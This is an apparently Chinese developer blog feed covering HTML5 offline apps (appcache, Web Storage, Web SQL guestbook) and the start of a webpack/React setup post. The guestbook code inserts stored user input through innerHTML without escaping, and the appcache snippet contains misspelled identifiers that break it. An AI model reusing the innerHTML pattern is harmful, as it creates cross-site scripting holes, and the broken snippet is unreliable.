title="简述浏览器请求数据过程："></a>简述浏览器请求数据过程：</h4><p>以www.luoxia520.com/code为例：<br><strong>首次访问</strong></p><ol><li>访问www.luoxia520.com/code</li><li>返回index.html文件</li><li>请求相关资源，如图片样式，manifest等</li><li>服务器返回资源</li><li>处理manifest,请求该文件要求缓存的资源</li><li>服务器返回缓存资源</li><li>本地缓存更新，触发事件通知更新</li></ol><p><strong>再次访问</strong></p><ol><li>再次访问www.luoxia520.com/code</li><li>发现index.html被缓存,使用缓存的inde.html</li><li>使用本地缓存的资源</li><li>请求服务器返回manifest</li><li>如果manifest有更新，则走上述5,6,7路线，若没有更新则通知没有变化</li></ol><h4 id="applicationCache对象"><a href="#applicationCache对象" class="headerlink" title="applicationCache对象"></a>applicationCache对象</h4><p><strong>updateready事件</strong></p><p>当检测到服务端返回的manifest文件更新,下载manifest所要求缓存资源到本地后触发这个事件</p><p><strong>swapCache方法</strong></p><p>有时候缓存资源太大，更新时间可能较长，我们可以在updateready事件触发式，手动更新本地缓存，然后提示用户刷新页面或者自动刷新页面：</p><p><strong>update方法</strong></p><p>检测服务端manifest文件是否更新，若更新则下载缓存资源，触发updateReady事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">application.update();</span><br><span class="line">&#125;,<span class="number">500</span>);</span><br><span class="line">applicationCache.onUpdateReady = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">applicationonCache.swapCache();</span><br><span class="line"><span class="keyword">if</span>(confirm(<span class="string">'本地缓存已更新，是否刷新获取最新应用版本'</span>))&#123;</span><br><span class="line">location.reload();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>本地缓存更新后，页面元素并不会立即更新，需要手动或自动刷新页面</li><li>当资源文件发生变化但manifest文件并没有变化时，页面并不会发生任何变化，除非更新manifest文件，这个时候可以通过更改版本号的方式实现manifest更新</li></ol><h3 id="本地数据储存"><a href="#本地数据储存" class="headerlink" title="本地数据储存"></a>本地数据储存</h3><h4 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h4><p>Web Storage是对HTML4中cookie机制的改善，包括<strong>sessionStorage</strong>和<strong>localStorage</strong>两种，前者临时保存（进入网页到关闭浏览器），后者为永久保存。</p><p>两者都是对简单的key/value形式的数据进行存取。</p><p><strong>存入数据</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sessionStorage.setItem(<span class="string">'key'</span>,<span class="string">'value'</span>);</span><br><span class="line"><span class="comment">//or </span></span><br><span class="line">sessionStorage.key = <span class="string">'value'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同理</span></span><br><span class="line">localStorage.setItem(<span class="string">'key'</span>,<span class="string">'value'</span>);</span><br><span class="line"><span class="comment">//or </span></span><br><span class="line">localStorage.key = <span class="string">'value'</span>;</span><br></pre></td></tr></table></figure><p><strong>读取数据</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessionStorage.getItem(<span class="string">'key'</span>);</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">sessionStorage.key;</span><br></pre></td></tr></table></figure></p><p><strong>清除数据</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localStorage.clear();</span><br></pre></td></tr></table></figure></p><p><strong>storage事件监听web storage变化</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onstorage = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//web storage发生变化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="本地数据库"><a href="#本地数据库" class="headerlink" title="本地数据库"></a>本地数据库</h4><p>HTML5提供了强大的本地数据库功能，丰富了本地储存内容，这样可以减轻服务器负担，使得web时代重回”客户端为重，服务端为轻”的时代。</p><p>本地数据可分为两种，一种是SQLLite,通过SQL语言访问，另一种是NoSQL型数据库indexdDB</p><h5 id="SQLLite"><a href="#SQLLite" class="headerlink" title="SQLLite"></a>SQLLite</h5><p><strong>创建数据库对象</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> db = openDatabase(<span class="string">'mydb'</span>,<span class="string">'1.0'</span>,<span class="string">'Test'</span>,<span class="number">102400</span>);</span><br></pre></td></tr></table></figure><p>接受参数：数据库名，版本，描述字符串，大小（单位为kb)</p><p><strong>事务处理</strong></p><p>transaction方法用于执行事务处理，以防止外界干扰</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.transaction(<span class="function"><span class="keyword">function</span>(<span class="params">tx</span>)</span>&#123;</span><br><span class="line">tx.executeSql(<span class="string">'CREATE TABLE IF NOT EXISTS MessageData(message TEXT)'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// db的transaction方法存入回调函数，transaction对象作为其参数，在这个对象上可以调用executeSql方法。</span></span><br></pre></td></tr></table></figure><p><strong>executeSql方法</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transaction.executeSql(sqlquery,[],datahandler,errorHandler);</span><br></pre></td></tr></table></figure></p><p>四个参数，SQL语句，其中变量用?代替，[]为与之对应的变量组成的数组，执行成功的回调和失败的回调。</p><p><strong>常用的SQL语句</strong></p><ol><li>CREATE TABLE name(key type, key type ….):创建表，name为表名，key为键名，type为该键的值类型,注：对于已经存在的表重复创建会报错，可以通过CREATE TABLE IF NOT EXISTS来检测当不存在时创建</li><li>SELECT * FROM name: 选择指定表中的数据，*表示所有</li><li>INSERT INTO name VALUES(?,?,?):插入数据到指定的表</li></ol><p><strong>一个关于Web SQL的实例（web留言本)</strong></p><p>index.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">'name'</span>&gt;</span>姓名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">id</span>=<span class="string">'name'</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">'year'</span>&gt;</span>年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">id</span>=<span class="string">'year'</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">80</span> <span class="attr">rows</span>=<span class="string">10</span> <span class="attr">id</span>=<span class="string">'message'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">'保存'</span> <span class="attr">id</span>=<span class="string">'save'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">'dataTable'</span> <span class="attr">border</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dataTable = <span class="built_in">document</span>.getElementById(<span class="string">'dataTable'</span>);</span><br><span class="line">    <span class="keyword">var</span> db = openDatabase(<span class="string">'myData'</span>,<span class="string">''</span>,<span class="string">'the local database'</span>,<span class="number">102400</span>);</span><br><span class="line">    <span class="keyword">var</span> save = <span class="built_in">document</span>.getElementById(<span class="string">'save'</span>);</span><br><span class="line">    save.onclick = saveData;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        showAllData();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">removeAllData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        dataTable.innerHTML = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">var</span> tr = <span class="built_in">document</span>.createElement(<span class="string">'tr'</span>),</span><br><span class="line">            th1 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>),</span><br><span class="line">            th2 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>),</span><br><span class="line">            th3 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>),</span><br><span class="line">            th4 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>);</span><br><span class="line"></span><br><span class="line">        th1.innerHTML = <span class="string">'姓名'</span>;</span><br><span class="line">        th2.innerHTML = <span class="string">'年龄'</span>;</span><br><span class="line">        th3.innerHTML = <span class="string">'时间'</span>;</span><br><span class="line">        th4.innerHTML = <span class="string">'消息'</span>;</span><br><span class="line">        tr.appendChild(th1);</span><br><span class="line">        tr.appendChild(th2);</span><br><span class="line">        tr.appendChild(th3);</span><br><span class="line">        tr.appendChild(th4);</span><br><span class="line"></span><br><span class="line">        dataTable.appendChild(tr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showData</span>(<span class="params">row</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> tr = <span class="built_in">document</span>.createElement(<span class="string">'tr'</span>),</span><br><span class="line">            td1 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>),</span><br><span class="line">            td2 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>),</span><br><span class="line">            td3 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>),</span><br><span class="line">            td4 = <span class="built_in">document</span>.createElement(<span class="string">'td'</span>);</span><br><span class="line"></span><br><span class="line">            td1.innerHTML = row.name;</span><br><span class="line">            td2.innerHTML = row.year;</span><br><span class="line">            td4.innerHTML = row.message;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            t.setTime(row.time);</span><br><span class="line">            td3.innerHTML = t.toLocaleDateString() + <span class="string">' '</span> + t.toLocaleTimeString();</span><br><span class="line"></span><br><span class="line">            tr.appendChild(td1);</span><br><span class="line">            tr.appendChild(td2);</span><br><span class="line">            tr.appendChild(td3);</span><br><span class="line">            tr.appendChild(td4);</span><br><span class="line"></span><br><span class="line">            dataTable.appendChild(tr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showAllData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        db.transaction(<span class="function"><span class="keyword">function</span>(<span class="params">tx</span>)</span>&#123;</span><br><span class="line">            tx.executeSql(<span class="string">'CREATE TABLE IF NOT EXISTS MsgData(name TEXT, year TEXT, time INTEGER, message TEXT)'</span>,[]);</span><br><span class="line">            tx.executeSql(<span class="string">'SELECT * FROM MsgData'</span>,[],<span class="function"><span class="keyword">function</span>(<span class="params">tx,rs</span>)</span>&#123;</span><br><span class="line">                removeAllData();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;rs.rows.length; i++)&#123;</span><br><span class="line">                    showData(rs.rows.item(i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addData</span>(<span class="params">name,year,time,message</span>)</span>&#123;</span><br><span class="line">        db.transaction(<span class="function"><span class="keyword">function</span>(<span class="params">tx</span>)</span>&#123;</span><br><span class="line">            tx.executeSql(<span class="string">'INSERT INTO MsgData VALUES(?,?,?,?)'</span>,[name,year,time,message],<span class="function"><span class="keyword">function</span>(<span class="params">tx,rs</span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">'数据保存成功'</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">saveData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> name = <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value;</span><br><span class="line">        <span class="keyword">var</span> year = <span class="built_in">document</span>.getElementById(<span class="string">'year'</span>).value;</span><br><span class="line">        <span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">'message'</span>).value;</span><br><span class="line">        <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line">        addData(name,year,time,msg);</span><br><span class="line">        showAllData();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>最终效果如下:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/webSQL.png" alt="webSql1"></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/webSQL2.png" alt="webSql2"></p><h5 id="indexedDB"><a href="#indexedDB" class="headerlink" title="indexedDB"></a>indexedDB</h5>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？&quot;&gt;&lt;a href=&quot;#所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？&quot; class=&quot;headerlink&quot; title=&quot;所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？&quot;&gt;&lt;/a&gt;所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;离线检测，可以检测设备是否联网来采取不同的策略&lt;/li&gt;
&lt;li&gt;需要提供本地缓存相关API,让用户联网时对一些必要资源进行本地缓存，如图片，css样式等文件&lt;/li&gt;
&lt;li&gt;需要提供本地数据储存API，来储存一些必要用户数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&quot;HTML5提供了强大的API来支持这些要求：&quot;&gt;&lt;a href=&quot;#HTML5提供了强大的API来支持这些要求：&quot; class=&quot;headerlink&quot; title=&quot;HTML5提供了强大的API来支持这些要求：&quot;&gt;&lt;/a&gt;HTML5提供了强大的API来支持这些要求：&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;navigator对象的onLine属性判断联网状态，并提供online,offline事件用于检测状态改变&lt;/li&gt;
&lt;li&gt;提供本地缓存（application cache)机制缓存必要数据&lt;/li&gt;
&lt;li&gt;提供WebStorage储存简单的key/value数据，提供本地数据库（包括SQLLite和IndexdDB，前者为SQL数据库，后者为NoSQL型数据库)&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="HTML5" scheme="http://luoxia.me/code/categories/HTML5/"/>
    
    
      <category term="离线应用" scheme="http://luoxia.me/code/tags/%E7%A6%BB%E7%BA%BF%E5%BA%94%E7%94%A8/"/>
    
      <category term="本地数据储存，本地应用缓存" scheme="http://luoxia.me/code/tags/%E6%9C%AC%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%82%A8%E5%AD%98%EF%BC%8C%E6%9C%AC%E5%9C%B0%E5%BA%94%E7%94%A8%E7%BC%93%E5%AD%98/"/>
    
  </entry>
  
  <entry>
    <title>webpack构建方案</title>
    <link href="http://luoxia.me/code/2016/07/25/webpack%E6%9E%84%E5%BB%BA%E6%96%B9%E6%A1%88/"/>
    <id>http://luoxia.me/code/2016/07/25/webpack构建方案/</id>
    <published>2016-07-25T07:35:05.000Z</published>
    <updated>2017-11-16T13:10:06.489Z</updated>
    
    <content type="html"><![CDATA[<p>webpack管理模块依赖然后打包输出文件，采用loader机制处理各个模块，并提供开发者环境自动化构建。本文通过实例，记录我的使用总结及遇到的问题，前面介绍一下webpack主要的内容，然后以react+ES2015+webpack为例演示，通过react-hot-loader局部地热更新组件提高开发效率。</p><a id="more"></a><h4 id="为什么使用webpack？"><a href="#为什么使用webpack？" class="headerlink" title="为什么使用webpack？"></a>为什么使用webpack？</h4><p>官方关于webpack出现的目的</p><ol><li>Split the dependency tree into chunks loaded on demand</li><li>Keep initial loading time low</li><li>Every static asset should be able to be a module</li><li>Ability to integrate 3rd-party libraries as modules</li><li>Ability to customize nearly every part of the module bundler<br>Suited for big projects</li></ol><p>可见webpack能够采用代码分块机制来防止一些无谓的资源加载，减少http请求优化渲染速率，把每个文件都视为模块采用loader机制进行处理，支持各种模块化规范，并且还能够提供自动化解决方案。</p><p>初步来看，webpack既能够像browserify那样管理依赖打包文件，又能像gulp那样对不同的文件进行处理并且能够实现自动化。种种优点，值得一试。</p><p>本文是我在学习中的总结，有些理解还不够，所以文章会持续更新，本来写文章的目的之一就是记录成长嘛~</p><h4 id="开始使用webpack"><a href="#开始使用webpack" class="headerlink" title="开始使用webpack"></a>开始使用webpack</h4><p><strong>全局安装webpack</strong></p><pre><code>npm install -g webpack</code></pre><p><strong>局部安装webpack</strong></p><pre><code>npm install --save-dev webpack</code></pre><p><strong>配置文件</strong></p><pre><code>项目根目录下webpack.config.js</code></pre><h4 id="配置webpack-config-js"><a href="#配置webpack-config-js" class="headerlink" title="配置webpack.config.js"></a>配置webpack.config.js</h4><h5 id="资源入口及打包输出："><a href="#资源入口及打包输出：" class="headerlink" title="资源入口及打包输出："></a>资源入口及打包输出：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">entry:[<span class="string">'./src/js/app.js'</span>],</span><br><span class="line">output:&#123;</span><br><span class="line">    path: __dirname + <span class="string">'/dist/js'</span>,</span><br><span class="line">    filename:<span class="string">'test.bundle.js'</span>,</span><br><span class="line">    publicPath:<span class="string">'/public'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的path要是绝对路径，__dirname是nodejs中的当前文件所在目录，关于publicPath,这个我折腾了些时间才理解。。。这个后面实例的时候仔细说明一下。</p><h5 id="资源的处理"><a href="#资源的处理" class="headerlink" title="资源的处理"></a>资源的处理</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>:&#123;</span><br><span class="line">    loaders:[</span><br><span class="line">        &#123;</span><br><span class="line">            test:<span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">            exclude:<span class="regexp">/node_modules/</span>,</span><br><span class="line">            loaders:[<span class="string">"react-hot"</span>,<span class="string">"babel"</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            test:<span class="regexp">/\.css$/</span>,</span><br><span class="line">            loader:<span class="string">'style!css'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            test: <span class="regexp">/\.scss$/</span>,</span><br><span class="line">            loader: <span class="string">'style!css!sass'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            test:<span class="regexp">/\.(jpg|png)$/</span>,</span><br><span class="line">            loader:<span class="string">'url'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>module配置项，通过loader机制对不同的文件（模块）进行处理，webpack视各种文件为模块，loader需要自己npm安装依赖，test是匹配文件类型，这里采用正则的方式进行匹配，exclude即忽略某些文件，避免去识别加载不必要的文件，loader(loaders)支持两种写法：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loader:<span class="string">"react-hot!babel"</span></span><br><span class="line"></span><br><span class="line">loaders:[<span class="string">"react-hot"</span>,<span class="string">"babel"</span>]</span><br></pre></td></tr></table></figure></p><p>两种写法都是从右往左进行处理，类似于gulp的pipe流，右侧的loader处理后，传递给左边的loader，直到最后。</p><h5 id="资源加载"><a href="#资源加载" class="headerlink" title="资源加载"></a>资源加载</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">    root: [process.cwd() + <span class="string">'/src'</span>, process.cwd() + <span class="string">'/node_modules'</span>],</span><br><span class="line">    alias: &#123;&#125;,</span><br><span class="line">    extensions: [<span class="string">''</span>, <span class="string">'.js'</span>, <span class="string">'.css'</span>, <span class="string">'.scss'</span>, <span class="string">'.ejs'</span>, <span class="string">'.png'</span>, <span class="string">'.jpg'</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>extensions即扩展名，当加载依赖模块时，可以智能化的扩充资源扩展名，而root的设置，使得我们可以直接加载npm包。</p><h5 id="插件的使用："><a href="#插件的使用：" class="headerlink" title="插件的使用："></a>插件的使用：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">    <span class="keyword">new</span> webpack.NoErrorsPlugin(),</span><br><span class="line">    <span class="keyword">new</span> webpack.BannerPlugin(<span class="string">'This file is created by LuoXia'</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>如上例，banner-plugin能够在最终的打包文件当中写明文件作者。。。</p><h5 id="代码分块-code-splitting-："><a href="#代码分块-code-splitting-：" class="headerlink" title="代码分块(code splitting)："></a>代码分块(code splitting)：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//static imports</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">'lodash'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dynamic imports</span></span><br><span class="line"><span class="built_in">require</span>.ensure([], <span class="function"><span class="keyword">function</span>(<span class="params">require</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> contacts = <span class="built_in">require</span>(<span class="string">'./contacts'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个暂时还没有实践,后面补充。</p><h5 id="实时更新（自动化构建）"><a href="#实时更新（自动化构建）" class="headerlink" title="实时更新（自动化构建）:"></a>实时更新（自动化构建）:</h5><pre><code>web-dev-server文件有更新会全局的刷新页面react-hot-loader监听组件变化，局部刷新</code></pre><h4 id="实践（ReactJS-ES2015-webpack"><a href="#实践（ReactJS-ES2015-webpack" class="headerlink" title="实践（ReactJS+ES2015+webpack):"></a>实践（ReactJS+ES2015+webpack):</h4><p>前阵子参与了学校60周年校庆网站的前端开发部分，子页有很多可以复用的部分，所以我把他们实现了组件化</p><h5 id="项目目录结构："><a href="#项目目录结构：" class="headerlink" title="项目目录结构："></a>项目目录结构：</h5><pre><code>---node_modules //npm包---dist //最终输出目录    --- js //bundle文件    --- index.html //入口页面---src //生成环境    ---components //组件所在目录        ---header //头部组件            ---style //组件样式                ---header.scss            ---js //组件js/jsx文件                ---header.js            ---images //图片资源        ---footer            ---style                ---footer.scss            ---js                footer.js            ---images        ---app.js //入口文件---package.json //npm包依赖管理---webpack.config.js //webpack配置文件---.babelrc //babel配置文件---.eslintrc.json //eslint配置---server.js //nodejs服务器---npm-debug.log //日志文件</code></pre><h5 id="编写组件"><a href="#编写组件" class="headerlink" title="编写组件:"></a>编写组件:</h5><p>依赖的其他组件，依赖的模块，依赖的图片资源文件，这些都可以当做模块来加载：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//footer.js</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"><span class="keyword">let</span> weibo = <span class="built_in">require</span>(<span class="string">'../images/fuwu.jpg'</span>);</span><br><span class="line"><span class="keyword">let</span> wechat = <span class="built_in">require</span>(<span class="string">'../images/dingyue.png'</span>);</span><br></pre></td></tr></table></figure></p><p>通过es2015的class来创建组件:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">FooterComponent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"footer"</span>&gt;</span></span></span><br><span class="line">            &lt;div className="footer-left"&gt;</span><br><span class="line">                &lt;p&gt;&#123;this.props.introContent[0]&#125;&lt;br/&gt;</span><br><span class="line">                    